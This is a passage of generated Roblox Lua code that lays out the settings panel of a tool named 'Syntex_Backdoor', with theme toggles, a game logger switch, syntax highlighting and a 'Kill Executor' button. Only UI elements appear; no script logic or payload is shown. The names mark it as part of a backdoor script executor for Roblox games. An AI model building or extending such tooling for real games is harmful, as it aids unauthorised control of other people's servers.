G2L["110"] = Instance.new("TextButton", G2L["10c"]);
G2L["110"]["BorderSizePixel"] = 0;
G2L["110"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["110"]["TextSize"] = 14;
G2L["110"]["BackgroundColor3"] = Color3.fromRGB(23, 224, 0);
G2L["110"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["110"]["Size"] = UDim2.new(0, 72, 0, 26);
G2L["110"]["BackgroundTransparency"] = 0.6;
G2L["110"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["110"]["Text"] = [[]];
G2L["110"]["Position"] = UDim2.new(0.82359, 0, 0.2, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.TextButton.anim
G2L["111"] = Instance.new("LocalScript", G2L["110"]);
G2L["111"]["Name"] = [[anim]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.TextButton.UICorner
G2L["112"] = Instance.new("UICorner", G2L["110"]);
G2L["112"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.TextButton.UIStroke
G2L["113"] = Instance.new("UIStroke", G2L["110"]);
G2L["113"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["113"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.TextButton.Frame
G2L["114"] = Instance.new("Frame", G2L["110"]);
G2L["114"]["BorderSizePixel"] = 0;
G2L["114"]["BackgroundColor3"] = Color3.fromRGB(142, 142, 142);
G2L["114"]["Size"] = UDim2.new(0, 15, 0, 15);
G2L["114"]["Position"] = UDim2.new(0.653, 0, 0.231, 0);
G2L["114"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.TextButton.Frame.UICorner
G2L["115"] = Instance.new("UICorner", G2L["114"]);
G2L["115"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.TextButton.Frame.UIStroke
G2L["116"] = Instance.new("UIStroke", G2L["114"]);
G2L["116"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["116"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.TextLabel
G2L["117"] = Instance.new("TextLabel", G2L["100"]);
G2L["117"]["BorderSizePixel"] = 0;
G2L["117"]["TextSize"] = 24;
G2L["117"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["117"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["117"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["117"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["117"]["BackgroundTransparency"] = 1;
G2L["117"]["Size"] = UDim2.new(0, 200, 0, 45);
G2L["117"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["Text"] = [[-- Themes --]];
G2L["117"]["Position"] = UDim2.new(-0.00293, 0, 0.14773, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme
G2L["118"] = Instance.new("Frame", G2L["100"]);
G2L["118"]["BorderSizePixel"] = 0;
G2L["118"]["BackgroundColor3"] = Color3.fromRGB(10, 10, 10);
G2L["118"]["Size"] = UDim2.new(0, 471, 0, 45);
G2L["118"]["Position"] = UDim2.new(-0.00103, 0, 0.56545, 0);
G2L["118"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["118"]["Name"] = [[galaxyTheme]];
G2L["118"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.UICorner
G2L["119"] = Instance.new("UICorner", G2L["118"]);

-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.UIStroke
G2L["11a"] = Instance.new("UIStroke", G2L["118"]);
G2L["11a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["11a"]["Thickness"] = 2.5;
G2L["11a"]["Color"] = Color3.fromRGB(18, 18, 18);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.TextLabel
G2L["11b"] = Instance.new("TextLabel", G2L["118"]);
G2L["11b"]["BorderSizePixel"] = 0;
G2L["11b"]["TextSize"] = 24;
G2L["11b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["11b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["11b"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["11b"]["BackgroundTransparency"] = 1;
G2L["11b"]["Size"] = UDim2.new(0, 200, 0, 45);
G2L["11b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11b"]["Text"] = [[Galaxy Theme]];
G2L["11b"]["Position"] = UDim2.new(0.015, 0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.TextButton
G2L["11c"] = Instance.new("TextButton", G2L["118"]);
G2L["11c"]["BorderSizePixel"] = 0;
G2L["11c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11c"]["TextSize"] = 14;
G2L["11c"]["BackgroundColor3"] = Color3.fromRGB(224, 0, 0);
G2L["11c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11c"]["Size"] = UDim2.new(0, 72, 0, 26);
G2L["11c"]["BackgroundTransparency"] = 0.6;
G2L["11c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11c"]["Text"] = [[]];
G2L["11c"]["Position"] = UDim2.new(0.82359, 0, 0.2, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.TextButton.anim
G2L["11d"] = Instance.new("LocalScript", G2L["11c"]);
G2L["11d"]["Name"] = [[anim]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.TextButton.UICorner
G2L["11e"] = Instance.new("UICorner", G2L["11c"]);
G2L["11e"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.TextButton.UIStroke
G2L["11f"] = Instance.new("UIStroke", G2L["11c"]);
G2L["11f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["11f"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.TextButton.Frame
G2L["120"] = Instance.new("Frame", G2L["11c"]);
G2L["120"]["BorderSizePixel"] = 0;
G2L["120"]["BackgroundColor3"] = Color3.fromRGB(142, 142, 142);
G2L["120"]["Size"] = UDim2.new(0, 15, 0, 15);
G2L["120"]["Position"] = UDim2.new(0.111, 0, 0.231, 0);
G2L["120"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.TextButton.Frame.UICorner
G2L["121"] = Instance.new("UICorner", G2L["120"]);
G2L["121"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.TextButton.Frame.UIStroke
G2L["122"] = Instance.new("UIStroke", G2L["120"]);
G2L["122"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["122"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme
G2L["123"] = Instance.new("Frame", G2L["100"]);
G2L["123"]["BorderSizePixel"] = 0;
G2L["123"]["BackgroundColor3"] = Color3.fromRGB(10, 10, 10);
G2L["123"]["Size"] = UDim2.new(0, 471, 0, 45);
G2L["123"]["Position"] = UDim2.new(-0.00103, 0, 0.78893, 0);
G2L["123"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["123"]["Name"] = [[lunarTheme]];
G2L["123"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.UICorner
G2L["124"] = Instance.new("UICorner", G2L["123"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.UIStroke
G2L["125"] = Instance.new("UIStroke", G2L["123"]);
G2L["125"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["125"]["Thickness"] = 2.5;
G2L["125"]["Color"] = Color3.fromRGB(18, 18, 18);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.TextLabel
G2L["126"] = Instance.new("TextLabel", G2L["123"]);
G2L["126"]["BorderSizePixel"] = 0;
G2L["126"]["TextSize"] = 24;
G2L["126"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["126"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["126"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["126"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["126"]["BackgroundTransparency"] = 1;
G2L["126"]["Size"] = UDim2.new(0, 200, 0, 45);
G2L["126"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["126"]["Text"] = [[Lunar Theme]];
G2L["126"]["Position"] = UDim2.new(0.015, 0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.TextButton
G2L["127"] = Instance.new("TextButton", G2L["123"]);
G2L["127"]["BorderSizePixel"] = 0;
G2L["127"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["127"]["TextSize"] = 14;
G2L["127"]["BackgroundColor3"] = Color3.fromRGB(224, 0, 0);
G2L["127"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["127"]["Size"] = UDim2.new(0, 72, 0, 26);
G2L["127"]["BackgroundTransparency"] = 0.6;
G2L["127"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["127"]["Text"] = [[]];
G2L["127"]["Position"] = UDim2.new(0.82359, 0, 0.2, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.TextButton.anim
G2L["128"] = Instance.new("LocalScript", G2L["127"]);
G2L["128"]["Name"] = [[anim]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.TextButton.UICorner
G2L["129"] = Instance.new("UICorner", G2L["127"]);
G2L["129"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.TextButton.UIStroke
G2L["12a"] = Instance.new("UIStroke", G2L["127"]);
G2L["12a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["12a"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.TextButton.Frame
G2L["12b"] = Instance.new("Frame", G2L["127"]);
G2L["12b"]["BorderSizePixel"] = 0;
G2L["12b"]["BackgroundColor3"] = Color3.fromRGB(142, 142, 142);
G2L["12b"]["Size"] = UDim2.new(0, 15, 0, 15);
G2L["12b"]["Position"] = UDim2.new(0.111, 0, 0.231, 0);
G2L["12b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.TextButton.Frame.UICorner
G2L["12c"] = Instance.new("UICorner", G2L["12b"]);
G2L["12c"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.TextButton.Frame.UIStroke
G2L["12d"] = Instance.new("UIStroke", G2L["12b"]);
G2L["12d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["12d"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger
G2L["12e"] = Instance.new("Frame", G2L["100"]);
G2L["12e"]["BorderSizePixel"] = 0;
G2L["12e"]["BackgroundColor3"] = Color3.fromRGB(10, 10, 10);
G2L["12e"]["Size"] = UDim2.new(0, 471, 0, 45);
G2L["12e"]["Position"] = UDim2.new(-0.00103, 0, 1.13742, 0);
G2L["12e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12e"]["Name"] = [[gameLogger]];
G2L["12e"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.UICorner
G2L["12f"] = Instance.new("UICorner", G2L["12e"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.UIStroke
G2L["130"] = Instance.new("UIStroke", G2L["12e"]);
G2L["130"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["130"]["Thickness"] = 2.5;
G2L["130"]["Color"] = Color3.fromRGB(18, 18, 18);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextLabel
G2L["131"] = Instance.new("TextLabel", G2L["12e"]);
G2L["131"]["BorderSizePixel"] = 0;
G2L["131"]["TextSize"] = 24;
G2L["131"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["131"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["131"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["131"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["131"]["BackgroundTransparency"] = 1;
G2L["131"]["Size"] = UDim2.new(0, 200, 0, 45);
G2L["131"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["131"]["Text"] = [[Game Logger]];
G2L["131"]["Position"] = UDim2.new(0.015, 0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextButton
G2L["132"] = Instance.new("TextButton", G2L["12e"]);
G2L["132"]["BorderSizePixel"] = 0;
G2L["132"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["132"]["TextSize"] = 14;
G2L["132"]["BackgroundColor3"] = Color3.fromRGB(23, 224, 0);
G2L["132"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["132"]["Size"] = UDim2.new(0, 72, 0, 26);
G2L["132"]["BackgroundTransparency"] = 0.6;
G2L["132"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["132"]["Text"] = [[]];
G2L["132"]["Position"] = UDim2.new(0.82359, 0, 0.2, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextButton.anim
G2L["133"] = Instance.new("LocalScript", G2L["132"]);
G2L["133"]["Name"] = [[anim]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextButton.UICorner
G2L["134"] = Instance.new("UICorner", G2L["132"]);
G2L["134"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextButton.UIStroke
G2L["135"] = Instance.new("UIStroke", G2L["132"]);
G2L["135"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["135"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextButton.Frame
G2L["136"] = Instance.new("Frame", G2L["132"]);
G2L["136"]["BorderSizePixel"] = 0;
G2L["136"]["BackgroundColor3"] = Color3.fromRGB(142, 142, 142);
G2L["136"]["Size"] = UDim2.new(0, 15, 0, 15);
G2L["136"]["Position"] = UDim2.new(0.653, 0, 0.231, 0);
G2L["136"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextButton.Frame.UICorner
G2L["137"] = Instance.new("UICorner", G2L["136"]);
G2L["137"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextButton.Frame.UIStroke
G2L["138"] = Instance.new("UIStroke", G2L["136"]);
G2L["138"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["138"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextButton.enb
G2L["139"] = Instance.new("BoolValue", G2L["132"]);
G2L["139"]["Name"] = [[enb]];
G2L["139"]["Value"] = true;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.TextLabel
G2L["13a"] = Instance.new("TextLabel", G2L["100"]);
G2L["13a"]["BorderSizePixel"] = 0;
G2L["13a"]["TextSize"] = 24;
G2L["13a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["13a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["13a"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["13a"]["BackgroundTransparency"] = 1;
G2L["13a"]["Size"] = UDim2.new(0, 200, 0, 37);
G2L["13a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13a"]["Text"] = [[-- Executor Functionalities --]];
G2L["13a"]["Position"] = UDim2.new(-0.00293, 0, 0.98485, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.TextLabel
G2L["13b"] = Instance.new("TextLabel", G2L["100"]);
G2L["13b"]["BorderSizePixel"] = 0;
G2L["13b"]["TextSize"] = 24;
G2L["13b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["13b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["13b"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["13b"]["BackgroundTransparency"] = 1;
G2L["13b"]["Size"] = UDim2.new(0, 200, 0, 37);
G2L["13b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13b"]["Text"] = [[-- Extra Things --]];
G2L["13b"]["Position"] = UDim2.new(-0.00293, 0, 1.56061, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.KillExecutor
G2L["13c"] = Instance.new("Frame", G2L["100"]);
G2L["13c"]["BorderSizePixel"] = 0;
G2L["13c"]["BackgroundColor3"] = Color3.fromRGB(10, 10, 10);
G2L["13c"]["Size"] = UDim2.new(0, 471, 0, 45);
G2L["13c"]["Position"] = UDim2.new(-0.00302, 0, 1.72075, 0);
G2L["13c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13c"]["Name"] = [[KillExecutor]];
G2L["13c"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.KillExecutor.UICorner
G2L["13d"] = Instance.new("UICorner", G2L["13c"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.KillExecutor.UIStroke
G2L["13e"] = Instance.new("UIStroke", G2L["13c"]);
G2L["13e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["13e"]["Thickness"] = 2.5;
G2L["13e"]["Color"] = Color3.fromRGB(18, 18, 18);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.KillExecutor.TextLabel
G2L["13f"] = Instance.new("TextLabel", G2L["13c"]);
G2L["13f"]["BorderSizePixel"] = 0;
G2L["13f"]["TextSize"] = 24;
G2L["13f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["13f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["13f"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["13f"]["BackgroundTransparency"] = 1;
G2L["13f"]["Size"] = UDim2.new(0, 200, 0, 45);
G2L["13f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13f"]["Text"] = [[Kill Executor]];
G2L["13f"]["Position"] = UDim2.new(0.015, 0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.KillExecutor.TextButton
G2L["140"] = Instance.new("TextButton", G2L["13c"]);
G2L["140"]["BorderSizePixel"] = 0;
G2L["140"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["140"]["TextSize"] = 14;
G2L["140"]["BackgroundColor3"] = Color3.fromRGB(224, 0, 0);
G2L["140"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["140"]["Size"] = UDim2.new(0, 72, 0, 26);
G2L["140"]["BackgroundTransparency"] = 0.6;
G2L["140"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["140"]["Text"] = [[]];
G2L["140"]["Position"] = UDim2.new(0.82359, 0, 0.2, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.KillExecutor.TextButton.LocalScript
G2L["141"] = Instance.new("LocalScript", G2L["140"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.KillExecutor.TextButton.UICorner
G2L["142"] = Instance.new("UICorner", G2L["140"]);
G2L["142"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.KillExecutor.TextButton.UIStroke
G2L["143"] = Instance.new("UIStroke", G2L["140"]);
G2L["143"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["143"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.KillExecutor.TextButton.TextLabel
G2L["144"] = Instance.new("TextLabel", G2L["140"]);
G2L["144"]["BorderSizePixel"] = 0;
G2L["144"]["TextSize"] = 24;
G2L["144"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["144"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["144"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["144"]["BackgroundTransparency"] = 1;
G2L["144"]["RichText"] = true;
G2L["144"]["Size"] = UDim2.new(0, 43, 0, 14);
G2L["144"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["144"]["Text"] = [[Kill]];
G2L["144"]["Position"] = UDim2.new(0.19555, 0, 0.22453, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight
G2L["145"] = Instance.new("Frame", G2L["100"]);
G2L["145"]["BorderSizePixel"] = 0;
G2L["145"]["BackgroundColor3"] = Color3.fromRGB(10, 10, 10);
G2L["145"]["Size"] = UDim2.new(0, 471, 0, 45);
G2L["145"]["Position"] = UDim2.new(-0.00103, 0, 1.37605, 0);
G2L["145"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["145"]["Name"] = [[syntaxHighlight]];
G2L["145"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.UICorner
G2L["146"] = Instance.new("UICorner", G2L["145"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.UIStroke
G2L["147"] = Instance.new("UIStroke", G2L["145"]);
G2L["147"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["147"]["Thickness"] = 2.5;
G2L["147"]["Color"] = Color3.fromRGB(18, 18, 18);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.TextLabel
G2L["148"] = Instance.new("TextLabel", G2L["145"]);
G2L["148"]["BorderSizePixel"] = 0;
G2L["148"]["TextSize"] = 24;
G2L["148"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["148"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["148"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["148"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["148"]["BackgroundTransparency"] = 1;
G2L["148"]["Size"] = UDim2.new(0, 200, 0, 45);
G2L["148"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["148"]["Text"] = [[Syntax Highlight]];
G2L["148"]["Position"] = UDim2.new(0.015, 0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.TextButton
G2L["149"] = Instance.new("TextButton", G2L["145"]);
G2L["149"]["BorderSizePixel"] = 0;
G2L["149"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["149"]["TextSize"] = 14;
G2L["149"]["BackgroundColor3"] = Color3.fromRGB(23, 224, 0);
G2L["149"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["149"]["Size"] = UDim2.new(0, 72, 0, 26);
G2L["149"]["BackgroundTransparency"] = 0.6;
G2L["149"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["149"]["Text"] = [[]];
G2L["149"]["Position"] = UDim2.new(0.82359, 0, 0.2, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.TextButton.anim
G2L["14a"] = Instance.new("LocalScript", G2L["149"]);
G2L["14a"]["Name"] = [[anim]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.TextButton.UICorner
G2L["14b"] = Instance.new("UICorner", G2L["149"]);
G2L["14b"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.TextButton.UIStroke
G2L["14c"] = Instance.new("UIStroke", G2L["149"]);
G2L["14c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["14c"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.TextButton.Frame
G2L["14d"] = Instance.new("Frame", G2L["149"]);
G2L["14d"]["BorderSizePixel"] = 0;
G2L["14d"]["BackgroundColor3"] = Color3.fromRGB(142, 142, 142);
G2L["14d"]["Size"] = UDim2.new(0, 15, 0, 15);
G2L["14d"]["Position"] = UDim2.new(0.653, 0, 0.231, 0);
G2L["14d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


